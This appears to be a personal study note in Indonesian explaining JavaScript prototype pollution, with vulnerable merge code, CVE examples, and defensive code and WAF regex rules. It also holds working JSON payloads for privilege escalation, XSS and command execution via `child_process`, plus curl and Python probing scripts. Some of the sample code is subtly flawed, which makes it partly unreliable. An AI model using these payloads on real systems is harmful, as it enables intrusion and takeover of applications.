---
title: "Prototype Pollution — JavaScript Attack Vector: Exploitation, Tooling, WAF Detection, Defense"
tags:
  - cyber-security
  - javascript
  - prototype-pollution
  - web-security
  - library
aliases:
  - "Prototype Pollution Complete Guide"
  - "JS Prototype Attack"
created: "2026-07-28"
updated: "2026-07-28"
status: pending
cssclasses:
  - wide-table
---

> [!info] Ringkasan
> Prototype Pollution adalah kerentanan JavaScript di mana attacker menyisipkan properti ke `Object.prototype` — yang kemudian diwarisi oleh semua objek di runtime. Ini bisa menyebabkan RCE, XSS, denial of service, atau privilege escalation tergantung bagaimana aplikasi menggunakan properti yang terkontaminasi. Banyak library JavaScript populer (jQuery, lodash, express) pernah memiliki kerentanan ini.

**Cross-link:** [[web-security]] → [[api-security-deep-dive]] → [[browser-security-exploitation-deepdive]] → [[web-hacking-exploitation]]

---

## Daftar Isi
- [[#1. JavaScript Prototype Mechanism]]
- [[#2. Attack Vectors — Merge/Assign/Clone]]
- [[#3. Exploitation Scenarios]]
- [[#4. Server-Side Prototype Pollution]]
- [[#5. Tools & Automation]]
- [[#6. WAF Detection Rules]]
- [[#7. Defense Strategy]]
- [[#8. Referensi]]

---

## 1. JavaScript Prototype Mechanism

Setiap objek JavaScript memiliki `__proto__` yang merujuk ke prototype class-nya. Jika `__proto__` dimodifikasi, semua objek yang dibuat dari class yang sama akan mewarisi modifikasi tersebut.

```javascript
// Normal object
let obj = {a: 1, b: 2};

// Prototype pollution
obj.__proto__.admin = true;
// atau
Object.prototype.admin = true;

// Sekarang SEMUA objek punya admin: true
let empty = {};
console.log(empty.admin); // true!
```

### Prototype Chain

```
obj → Object.prototype → null
arr → Array.prototype → Object.prototype → null
func → Function.prototype → Object.prototype → null
```

Jika `Object.prototype` di-pollute, **semua objek** terpengaruh.

---

## 2. Attack Vectors — Merge/Assign/Clone

### Vulnerable Patterns

```javascript
// ❌ Recursive merge — pola paling umum
function merge(target, source) {
  for (let key in source) {
    if (isObject(source[key])) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

// Exploit: merge({}, JSON.parse('{"__proto__": {"polluted": true}}'))
// → Object.prototype.polluted = true
```

### Common Vulnerable Functions

| Library | Fungsi | CVE |
|---|---|---|
| jQuery | `$.extend(true, {}, input)` | CVE-2019-11358 |
| lodash | `_.defaultsDeep({}, input)` | CVE-2019-10744 |
| Express | `body-parser` JSON parsing | — |
| Socket.io | `socket.io` parser | — |

### Payload Vectors

```json
// Via JSON body
POST /api/users
Content-Type: application/json

{"__proto__": {"admin": true}}

// Via nested path
{"constructor": {"prototype": {"admin": true}}}

// Via array index
{"__proto__": {"0": "polluted"}}
```

---

## 3. Exploitation Scenarios

### XSS via Prototype Pollution

```json
// Pollute innerHTML default
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}

// Jika aplikasi render objek tanpa sanitasi
// → objek apapun yang di-render akan memiliki innerHTML jahat
```

### RCE via PP + template

```javascript
// Jika aplikasi menggunakan template string dengan eval
// Pollution bisa inject code

{"__proto__": {"_template": "global.process.mainModule.require('child_process').execSync('id')"}}
```

### Auth Bypass

```javascript
// Pollute default auth state
{"__proto__": {"authenticated": true, "role": "admin"}}

// Sekarang semua objek user dianggap authenticated
```

---

## 4. Server-Side Prototype Pollution

Server-side PP lebih berbahaya karena bisa RCE.

### Express Body Parser

```javascript
// Express body-parser JSON parsing
app.use(bodyParser.json()); // ← vulnerable jika tidak dibatasi depth

// Payload:
// POST /api {"__proto__": {"admin": true}}
// → Object.prototype.admin = true
```

### Vulnerability Detection

```bash
# Cek apakah app vulnerable
curl -X POST http://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"test": true}}'

# Cek apakah pollution berhasil
curl http://target.com/api/check
# Jika response mengandung "test": true → vulnerable
```

---

## 5. Tools & Automation

| Tool | Fungsi |
|---|---|
| **PPFuzz** | Automated prototype pollution fuzzing |
| **Burp Scanner** | Deteksi PP via passive/active scan |
| **Server-Side PP Scanner** | Auto-detect server-side PP |
| **Custom Node.js** | Manual testing via script |

### Manual Testing

```python
import requests

# Test POST merge
payloads = [
    '{"__proto__": {"polluted": true}}',
    '{"constructor": {"prototype": {"polluted": true}}}',
    '[{"__proto__": {"polluted": true}}]',
    '{"__proto__": {"0": "polluted"}}',
    '{"a": {"__proto__": {"polluted": true}}}',
]

base_url = "http://target.com/api"

for p in payloads:
    r = requests.post(base_url, json=p)
    # Cek response atau side-effect
```

---

## 6. WAF Detection Rules

```rust
// src/rules/body.rs — Prototype Pollution Detection
static PROTO_POLLUTE_JSON: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#""__proto__"\s*:"#).unwrap()
});

static PROTO_POLLUTE_CONSTRUCTOR: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#""constructor"\s*:\s*\{[^}]*"prototype""#).unwrap()
});
```

### Aturan di CRS

```bash
# OWASP CRS: REQUEST-933-APPLICATION-ATTACK-PHP.conf
# PHP juga punya prototype-like attack (stdClass)
```

---

## 7. Defense Strategy

| Defense | Implementasi |
|---|---|
| **Sanitasi input** | Strip `__proto__`, `constructor`, `prototype` dari input |
| **Immutable merge** | Gunakan `Object.assign` atau spread operator (tidak recursive) |
| **JSON.parse reviver** | Custom reviver untuk reject prototype keys |
| **Schema validasi** | Validasi struktur input sebelum merge |
| **Map instead of Object** | Gunakan `Map` untuk key-value storage |
| **Object.create(null)** | Objek tanpa prototype chain |

### Safe JSON Parse

```javascript
// Safe reviver — reject prototype pollution
function safeJSONParse(str) {
  return JSON.parse(str, (key, value) => {
    if (key === '__proto__' || key === 'constructor') {
      throw new Error('Prototype pollution detected');
    }
    return value;
  });
}
```

### Safe Merge

```javascript
function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (key === '__proto__' || key === 'constructor') continue;
    if (isObject(source[key])) {
      target[key] = safeMerge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

---

## 8. Referensi

- PayloadsAllTheThings: `/mnt/data_d/Projects/Reference/PayloadsAllTheThings/Prototype Pollution/`
- OWASP: Prototype Pollution Prevention Cheat Sheet

**Cross-link vault:**
- [[web-security]] — web security dasar
- [[api-security-deep-dive]] — API security
- [[browser-security-exploitation-deepdive]] — browser attack
- [[web-hacking-exploitation]] — teknik exploit
- [[vault:01_Library/Cyber_Security/Web_Security/]] — security references
